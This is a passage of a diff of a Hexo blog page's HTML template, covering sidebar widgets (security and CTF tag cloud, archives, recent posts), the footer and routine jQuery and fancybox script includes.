class="tag-list-item"><a class="tag-list-link" href="../../../../tags/%E6%8E%A8%E5%85%8D/" rel="tag">推免</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/" rel="tag">漏洞基础</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/%E7%89%9B%E5%AE%A2%E7%BD%91/" rel="tag">牛客网</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/" rel="tag">环境搭建</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/%E8%93%9D%E6%A1%A5%E6%9D%AF/" rel="tag">蓝桥杯</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/%E8%A5%BF%E5%8D%97%E7%A7%91%E6%8A%80%E5%A4%A7%E5%AD%A6%E6%96%B0%E7%94%9F%E8%B5%9B/" rel="tag">西南科技大学新生赛</a></li></ul>
+    </div>
+  </div>
 
 
-<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
-<script src="/fancybox/jquery.fancybox.pack.js"></script>
-<script type="text/javascript">
-(function($){
-  $('.fancybox').fancybox();
-})(jQuery);
-</script>
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
+      <a href="../../../../tags/book/" style="font-size: 10px;">book</a> <a href="../../../../tags/buu%E5%88%B7%E9%A2%98/" style="font-size: 20px;">buu刷题</a> <a href="../../../../tags/c-%E5%9F%BA%E7%A1%80/" style="font-size: 10px;">c++基础</a> <a href="../../../../tags/ciscn/" style="font-size: 10px;">ciscn</a> <a href="../../../../tags/csapp/" style="font-size: 13.33px;">csapp</a> <a href="../../../../tags/dasctf/" style="font-size: 10px;">dasctf</a> <a href="../../../../tags/double-free/" style="font-size: 10px;">double free</a> <a href="../../../../tags/fastbin-attack/" style="font-size: 10px;">fastbin attack</a> <a href="../../../../tags/flair/" style="font-size: 10px;">flair</a> <a href="../../../../tags/fmt/" style="font-size: 10px;">fmt</a> <a href="../../../../tags/git/" style="font-size: 10px;">git</a> <a href="../../../../tags/googlectf-2020/" style="font-size: 10px;">googlectf 2020</a> <a href="../../../../tags/house-of-force/" style="font-size: 13.33px;">house of force</a> <a href="../../../../tags/house-of-orange/" style="font-size: 10px;">house of orange</a> <a href="../../../../tags/kernel-pwn/" style="font-size: 13.33px;">kernel pwn</a> <a href="../../../../tags/leetcode/" style="font-size: 13.33px;">leetcode</a> <a href="../../../../tags/mips-pwn/" style="font-size: 10px;">mips pwn</a> <a href="../../../../tags/off-by-one/" style="font-size: 10px;">off by one</a> <a href="../../../../tags/pwn/" style="font-size: 10px;">pwn</a> <a href="../../../../tags/pwnable-tw/" style="font-size: 13.33px;">pwnable.tw</a> <a href="../../../../tags/srop/" style="font-size: 10px;">srop</a> <a href="../../../../tags/unlink/" style="font-size: 13.33px;">unlink</a> <a href="../../../../tags/unsortedbin-attack/" style="font-size: 10px;">unsortedbin attack</a> <a href="../../../../tags/v8/" style="font-size: 10px;">v8</a> <a href="../../../../tags/%E3%80%8A%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%9C%9F%E7%9B%B8%E8%BF%98%E5%8E%9F%E3%80%8B/" style="font-size: 10px;">《操作系统真相还原》</a> <a href="../../../../tags/%E4%BA%BA%E7%94%9F/" style="font-size: 10px;">人生</a> <a href="../../../../tags/%E5%87%BA%E9%A2%98%E7%8E%AF%E5%A2%83/" style="font-size: 10px;">出题环境</a> <a href="../../../../tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" style="font-size: 16.67px;">基础知识</a> <a href="../../../../tags/%E5%9F%BA%E7%A1%80%E7%BB%83%E4%B9%A0/" style="font-size: 10px;">基础练习</a> <a href="../../../../tags/%E5%A4%A9%E6%A2%AF%E8%B5%9B/" style="font-size: 10px;">天梯赛</a> <a href="../../../../tags/%E5%AE%89%E8%A3%85/" style="font-size: 10px;">安装</a> <a href="../../../../tags/%E6%8E%A8%E5%85%8D/" style="font-size: 10px;">推免</a> <a href="../../../../tags/%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/" style="font-size: 10px;">漏洞基础</a> <a href="../../../../tags/%E7%89%9B%E5%AE%A2%E7%BD%91/" style="font-size: 10px;">牛客网</a> <a href="../../../../tags/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/" style="font-size: 10px;">环境搭建</a> <a href="../../../../tags/%E8%93%9D%E6%A1%A5%E6%9D%AF/" style="font-size: 20px;">蓝桥杯</a> <a href="../../../../tags/%E8%A5%BF%E5%8D%97%E7%A7%91%E6%8A%80%E5%A4%A7%E5%AD%A6%E6%96%B0%E7%94%9F%E8%B5%9B/" style="font-size: 10px;">西南科技大学新生赛</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="../../../../archives/2021/10/">October 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="../../../../archives/2021/08/">August 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="../../../../archives/2021/06/">June 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="../../../../archives/2021/05/">May 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="../../../../archives/2021/04/">April 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="../../../../archives/2021/03/">March 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="../../../../archives/2021/02/">February 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="../../../../archives/2021/01/">January 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="../../../../archives/2020/11/">November 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="../../../../archives/2020/10/">October 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="../../../../archives/2020/09/">September 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="../../../../archives/2020/07/">July 2020</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="../../../10/30/%E7%94%A8%E9%9A%8F%E6%9C%BA%E6%A2%AF%E5%BA%A6%E4%B8%8B%E9%99%8D%E6%9D%A5%E4%BC%98%E5%8C%96%E4%BA%BA%E7%94%9F/">用随机梯度下降来优化人生</a>
+          </li>
+        
+          <li>
+            <a href="../../../10/14/%C2%962021%E6%8E%A8%E5%85%8D%E6%80%BB%E7%BB%93/">2021推免总结</a>
+          </li>
+        
+          <li>
+            <a href="../../../10/08/rsa%E7%AE%97%E6%B3%95/">rsa算法</a>
+          </li>
+        
+          <li>
+            <a href="../../../08/26/leetcode%E4%B9%8B%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E8%AE%A1%E5%88%92/">leetcode之算法学习计划</a>
+          </li>
+        
+          <li>
+            <a href="../../../08/07/LearnBlockchainbyBuildingOne/">Learn Blockchain by Building One_book study</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2022 winter<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="../../../../index.html" class="mobile-nav-link">Home</a>
+  
+    <a href="../../../../archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  
+<link rel="stylesheet" href="../../../../fancybox/jquery.fancybox.css">
+
+  
+<script src="../../../../fancybox/jquery.fancybox.pack.js"></script>
 
 
 
-   <script type="text/javascript">      
-     var search_path = "search.xml";
-	 if (search_path.length == 0) {
-	 	search_path = "search.xml";
-	 }
-	 var path = "/" + search_path;
-     searchFunc(path, 'local-search-input', 'local-search-result');
-   </script>
 
+<script src="../../../../js/script.js"></script>
+
+
+
+
+  </div>
 </body>
-   </html>
+</html>
